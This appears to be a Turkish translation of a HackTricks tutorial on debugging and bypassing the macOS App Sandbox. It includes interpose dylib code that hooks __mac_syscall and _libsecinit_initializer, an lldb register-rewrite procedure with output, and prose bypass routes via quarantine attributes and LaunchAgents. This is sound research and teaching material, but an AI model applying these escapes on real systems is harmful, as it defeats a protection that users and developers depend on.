# macOS Sandbox Hata Ayıklama ve Atlatma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.

</details>

## Kum havuzu yükleme süreci

<figure><img src="../../../../../.gitbook/assets/image (898).png" alt=""><figcaption><p>Resim: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Önceki resimde, **`com.apple.security.app-sandbox`** yetkisi olan bir uygulama çalıştırıldığında **kum havuzunun nasıl yükleneceği** görülebilir.

Derleyici, `/usr/lib/libSystem.B.dylib`'i ikili dosyaya bağlayacaktır.

Ardından, **`libSystem.B`**, **`xpc_pipe_routine`**'dan uygulamanın yetkilerini **`securityd`**'ye gönderene kadar diğer birçok işlevi çağıracaktır. Securityd, işlemin kum havuzunda karantinaya alınıp alınmaması gerektiğini kontrol eder ve eğer gerekiyorsa karantinaya alır.\
Son olarak, kum havuzu, **`__sandbox_ms`**'yi çağıracak ve **`__mac_syscall`**'ı çağıracaktır.

## Mümkün Atlatmalar

### Karantina özniteliğini atlatma

**Kum havuzlu işlemler tarafından oluşturulan dosyalara**, kum havuzundan kaçınmak için **karantina özniteliği** eklenir. Ancak, kum havuzlu bir uygulama içinde **karantina özniteliği olmayan bir `.app` klasörü oluşturmayı** başarırsanız, uygulama paketi ikilisini **`/bin/bash`**'e işaret edecek şekilde ayarlayabilir ve **plist**'e bazı çevresel değişkenler ekleyerek **`open`**'ı kötüye kullanarak **yeni uygulamayı kum havuzundan kaçınarak başlatabilirsiniz**.

Bu, [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**'de yapılan şeydir.**

{% hint style="danger" %}
Bu nedenle, şu anda, yalnızca karantina özniteliği olmayan bir isimle biten bir klasör oluşturabilme yeteneğine sahipseniz, macOS yalnızca **`.app` klasörü** ve **ana yürütülebilir** dosyadaki **karantina** özniteliğini kontrol eder (ve ana yürütülebilir dosyayı **`/bin/bash`**'e işaret edeceğiz).

Bir .app paketinin zaten çalıştırılmasına izin verildiyse (çalıştırılmasına izin verilen bayrakla karantina xttr'ye sahiptir), bunu da kötüye kullanabilirsiniz... ancak şimdi **.app** paketlerine yazamazsınız çünkü bazı ayrıcalıklı TCC izinlerine sahip olmadıkça (yüksek bir kum havuzunda olmayacaksınız).

{% endhint %}

### Open işlevini kötüye kullanma

[**Word kum havuzu atlatmalarının son örneklerinde**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), **`open`** komut satırı işlevinin kum havuzunu atlamak için nasıl kötüye kullanılabileceği görülebilir.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Başlatma Ajanları/Hizmetleri

Bir uygulamanın **kum havuzunda olması amaçlansa da** (`com.apple.security.app-sandbox`), örneğin bir **LaunchAgent** (`~/Library/LaunchAgents`) tarafından çalıştırılıyorsa kum havuzunu atlatmak mümkündür.\
[**Bu yazıda**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) açıklandığı gibi, kum havuzunda olan bir uygulamayla kalıcılık sağlamak istiyorsanız, uygulamanın otomatik olarak bir LaunchAgent olarak çalıştırılmasını sağlayabilir ve belki de DyLib çevresel değişkenler aracılığıyla kötü amaçlı kod enjekte edebilirsiniz.

### Otomatik Başlatma Konumlarını Kötüye Kullanma

Bir kum havuzlu işlem, **daha sonra kum havuzundan kaçınarak çalışacak bir uygulamanın ikilisinin çalışacağı yere yazabilirse**, oraya ikilisini yerleştirerek **kaçabilir**. Bu tür konumların iyi bir örneği `~/Library/LaunchAgents` veya `/System/Library/LaunchDaemons`'tir.

Bunun için belki de **2 adıma** ihtiyacınız olabilir: **Daha geniş kum havuzlu bir işlem** (`file-read*`, `file-write*`) kodunuzu yürütecek ve aslında **kum havuzundan kaçınarak çalışacak yere yazacak**.

**Otomatik Başlatma konumları** hakkında bu sayfaya göz atın:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Diğer işlemleri Kötüye Kullanma

Kum havuzlu işlemdeyken **daha az kısıtlayıcı kum havuzlarında çalışan diğer işlemleri** tehlikeye atabilirseniz, onların kum havuzlarından kaçabilirsiniz:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statik Derleme ve Dinamik Bağlama

[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'u atlatmanın 2 yolunu keşfetti. Sandbox, **libSystem** kütüphanesi yüklendiğinde kullanıcı alanından uygulanır. Bir ikili dosya bu kütüphaneyi yüklemeyi başarabilirse, kum havuzuna alınmaz:

* Eğer ikili dosya **tamamen statik olarak derlenmişse**, o kütüphaneyi yüklemeyi atlayabilir.
* Eğer **ikili dosyanın herhangi bir kütüphane yüklemesi gerekmiyorsa** (çünkü bağlayıcı da libSystem'de ise), libSystem'u yüklemesi gerekmez.

### Kabuk Kodları

Not edin ki **ARM64'te bile kabuk kodları** `libSystem.dylib`'e bağlanmak zorundadır:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Yetkiler

Belirli bir **yetkiye** sahip bir uygulamanın, bir **kum havuzu** içinde bile **izin verilen bazı işlemler** gerçekleştirebileceğini unutmayın, örneğin:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Araya Girme Atlatma

Daha fazla bilgi için **Araya Girme** hakkında şu adrese bakın:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Kum havuzunu önlemek için `_libsecinit_initializer` araya girin
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Sandbox'ı Engellemek İçin `__mac_syscall`'ı Araya Sok

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Sandbox'u lldb ile hata ayıklama ve atlatma

Sandbox uygulanmış bir uygulamayı derleyelim:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}Bu dosya, uygulamanın hangi özel yetkilere sahip olduğunu belirten bir XML belgesidir. Uygulamanın sandbox içinde çalışırken erişebileceği sistem kaynaklarını ve yetkilerini tanımlar. Bu dosya, uygulamanın güvenlik ve gizlilik seviyesini belirler.{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %} 

## Info.plist

Bu dosya, uygulamanın Sandbox ayarlarını tanımlar. Sandbox, uygulamanın belirli kısıtlamalara tabi olmasını sağlayan bir güvenlik önlemidir. Bu dosyayı inceleyerek uygulamanın hangi izinlere sahip olduğunu ve hangi kısıtlamalara tabi olduğunu görebilirsiniz. Bu bilgiler, Sandbox'ı atlatma veya hata ayıklama yöntemleri geliştirirken önemli olabilir. 

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Ardından uygulamayı derleyin:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Uygulama, **Sandbox'ın izin vermeyeceği** **`~/Desktop/del.txt`** dosyasını **okumaya çalışacak**.\
Sandbox'ı atladıktan sonra okuyabileceği bir dosya oluşturun:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Uygulamayı hata ayıklamak için Sandbox'ın ne zaman yüklendiğini görelim:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Sandbox atlatıldığında bile TCC**, kullanıcıya masaüstünden dosya okuma izni vermek isteyip istemediğini soracaktır.
{% endhint %}

## Referanslar

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ve** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github depolarına katkıda bulunun.**

</details>
